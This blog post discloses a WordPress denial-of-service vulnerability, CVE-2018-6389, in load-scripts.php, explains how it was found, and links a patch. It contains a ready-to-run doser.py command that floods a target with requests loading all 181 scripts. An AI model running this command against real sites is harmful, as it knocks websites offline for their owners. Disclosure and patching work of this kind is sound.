---
layout: post
title: How to DoS 29% of the World Wide Websites - CVE-2018-6389
---

According to wordpress.com, the WordPress platform powers 29% of the worldwide internet websites.

In this article I am going to explain how Denial of Service can easily be caused to almost any WordPress website online, and how you can patch your WordPress website in order to avoid this vulnerability being exploited.

It is important to note that exploiting this vulnerability is illegal, unless you have permission from the website owner.

  

While browsing a WordPress website, my attention was drawn to the following URL:

[https://WPServer/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core&ver=4.9.1](https://wpserver/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core&ver=4.9.1)

  

The load-scripts.php file receives a parameter called load\[\], the parameter value is 'jquery-ui-core'. In the response, I received the JS module 'jQuery UI Core' that was requested, as demonstrated in the following image:

  

[![](https://2.bp.blogspot.com/-4F7k687LhtY/WnNOLb2JEeI/AAAAAAAAeWo/Zg1InG9enfovEub5JguGQc7ODGDVpxVnwCPcBGAYYCw/s400/wordpress_DoS90975.jpg)](https://2.bp.blogspot.com/-4F7k687LhtY/WnNOLb2JEeI/AAAAAAAAeWo/Zg1InG9enfovEub5JguGQc7ODGDVpxVnwCPcBGAYYCw/s1600/wordpress_DoS90975.jpg)

  

  
  

What can be concluded from this URL, is that it is probably meant to supply users with some JS modules. In addition, the load\[\] parameter is an array, which means that it is possible to provide multiple values and be able to get multiple JS modules within the response.

  

As [WordPress is open-source](https://github.com/wordPress/WordPress), it is easy to perform code review and explore this feature. After doing so, I realized that this feature was designed to economize the amount of requests sent from the client while trying to load JS or CSS files, so when the browser needs to load multiple JS/CSS files, it will use load-scripts.php (for JS) or load-styles.php (for CSS files) and the browser will get multiple JS/CSS files through a single request- so performance-wise it is better to do so and the page will load faster. This feature was designed only for the admin pages, but is also used on the wp-login.php page, so no authentication is enforced on these files.  
  

First, I tried to manipulate this feature and provide a list of the 'jquery-ui-core' value multiple times as follows:

[https://WPServer/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core&ver=4.9.1](https://wpserver/wp-admin/load-scripts.php?c=1&load%5B%5D=jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core,jquery-ui-core&ver=4.9.1)

  

I thought I might make the server read the same file over and over again and append it to the same response, but the use of the 'array\_unique' function removes duplicates in arrays so that didn’t succeeded:  
  

[![](https://2.bp.blogspot.com/-dHeIDEGuHso/WnNRpQcDc0I/AAAAAAAAeW0/PMNGAIBRM6gnrxNlA8XPaEZ7cTP_nrLQACPcBGAYYCw/s400/wordpress_DoS29538.jpg)](https://2.bp.blogspot.com/-dHeIDEGuHso/WnNRpQcDc0I/AAAAAAAAeW0/PMNGAIBRM6gnrxNlA8XPaEZ7cTP_nrLQACPcBGAYYCw/s1600/wordpress_DoS29538.jpg)

  

  

  

I kept exploring the code and found something that looked interesting in the following code snippet, which I wanted to investigate further:

  

[![](https://1.bp.blogspot.com/-V7mYFyTsoRE/WnNShajANyI/AAAAAAAAeW8/GdX9vMUBui4cTVXl5pbT4QA7PgQm6MyJgCPcBGAYYCw/s400/wordpress_DoS13936.jpg)](https://1.bp.blogspot.com/-V7mYFyTsoRE/WnNShajANyI/AAAAAAAAeW8/GdX9vMUBui4cTVXl5pbT4QA7PgQm6MyJgCPcBGAYYCw/s1600/wordpress_DoS13936.jpg)

  

There is a well-defined list ($wp\_scripts), that can be requested by users as part of the load\[\] parameter. If the requested value exists, the server will perform an I/O read action for a well-defined path associated with the supplied value from the user.

  

The wp\_scripts list is hard-coded and is defined in the [script-loader.php](https://github.com/WordPress/WordPress/blob/master/wp-includes/script-loader.php) file:

  

[![](https://4.bp.blogspot.com/-y8i3CuXCPeg/WnNTlVC6zsI/AAAAAAAAeXI/sbEG8V8B-_8rcekg-MFhDbbhzIgo5WRHgCPcBGAYYCw/s640/wordpress_DoS84477.jpg)](https://4.bp.blogspot.com/-y8i3CuXCPeg/WnNTlVC6zsI/AAAAAAAAeXI/sbEG8V8B-_8rcekg-MFhDbbhzIgo5WRHgCPcBGAYYCw/s1600/wordpress_DoS84477.jpg)

  

  

There are 181 values in this list:
```javascript
eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```
  

I wondered what would happen if I sent the server a request to supply me every JS module that it stored? A single request would cause the server to perform 181 I/O actions and provide the file contents in the response.  
  
So I tried it, I sent the request to the server:

  

[![](https://2.bp.blogspot.com/-Y3-moeyXvPQ/WnNV7mKCU5I/AAAAAAAAeXU/RhU4-o_eYs8657dpBYTOUQSTshEqOmcMACPcBGAYYCw/s640/wordpress_DoS83402.jpg)](https://2.bp.blogspot.com/-Y3-moeyXvPQ/WnNV7mKCU5I/AAAAAAAAeXU/RhU4-o_eYs8657dpBYTOUQSTshEqOmcMACPcBGAYYCw/s1600/wordpress_DoS83402.jpg)

  

The server responded after 2.2 seconds, with almost 4MB of data, which made the server work really hard to process such a request.

So I decided to use [doser.py](https://github.com/quitten/doser.py), a simple tool that I wrote, designed to constantly repeat requests (yes, I know Python threads suck, but I still love Python!) in order to cause DoS, and guess what? it worked! :)
```bash
python doser.py -g 'http://mywpserver.com/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999
```
  

As long as I kept sending those requests to the server, it was too busy to handle any other request, and I had effectively (and easily) caused DoS.

  

It is time to mention again that load-scripts.php does not require any authentication, an anonymous user can do so.

After ~500 requests, the server didn't respond at all any more, or returned 502/503/504 status code errors like:  
  

[![](https://2.bp.blogspot.com/-CZfC8TqhR7I/WnSt5WhMn1I/AAAAAAAAecw/3yc5vXKh-G4NIEOFtqUSjL_ap7c9ipK8wCPcBGAYYCw/s320/503.jpeg)](https://2.bp.blogspot.com/-CZfC8TqhR7I/WnSt5WhMn1I/AAAAAAAAecw/3yc5vXKh-G4NIEOFtqUSjL_ap7c9ipK8wCPcBGAYYCw/s1600/503.jpeg)

  

[![](https://2.bp.blogspot.com/-klcJxiz-FQg/WnSufnQqUSI/AAAAAAAAec8/6tvTo7IZtkMiPdFTAwrJK5fSJuyZhZcJQCPcBGAYYCw/s320/522.jpeg)](https://2.bp.blogspot.com/-klcJxiz-FQg/WnSufnQqUSI/AAAAAAAAec8/6tvTo7IZtkMiPdFTAwrJK5fSJuyZhZcJQCPcBGAYYCw/s1600/522.jpeg)

  

[![](https://2.bp.blogspot.com/-BMq_fAPVm7k/WnStEObY-mI/AAAAAAAAeco/ih28vCrQWocElxfv3DH5DA3QDSpAxglHQCPcBGAYYCw/s320/wordpress_DoS85318.jpg)](https://2.bp.blogspot.com/-BMq_fAPVm7k/WnStEObY-mI/AAAAAAAAeco/ih28vCrQWocElxfv3DH5DA3QDSpAxglHQCPcBGAYYCw/s1600/wordpress_DoS85318.jpg)

  

  

Full PoC video:
https://www.youtube.com/watch?v=nNDsGTalXS0
  

  

WordPress has a bug bounty program, and I contacted them about this issue, even though I knew DoS vulnerabilities are out-of-scope, I reported it through HackerOne and explained the vulnerability, I thought they would understand that there is a security issue here and properly address it. After going back and forth about it a few times and my trying to explain and provide a PoC, they refused to acknowledge it and claimed that:  
"This kind of thing should really be mitigated at the server or network level rather than the application level, which is outside of WordPress's control."

  

Even though I was extremely frustrated about them not acknowledging this as a vulnerability, I kept on exploring how I can mitigate this attack, and [forked WordPress project and patched it](https://github.com/quitten/WordPress) so no one but authenticated users can access the load-\*.php files, without actually harming the wp-login.php file functionality. So if you are currently using, or are about to use, WordPress, I would highly recommend you use the patched version.

In case you already have a WordPress website on a Linux machine, I created [this bash script](https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh) that modifies the relevant files in order to mitigate the vulnerability.

  
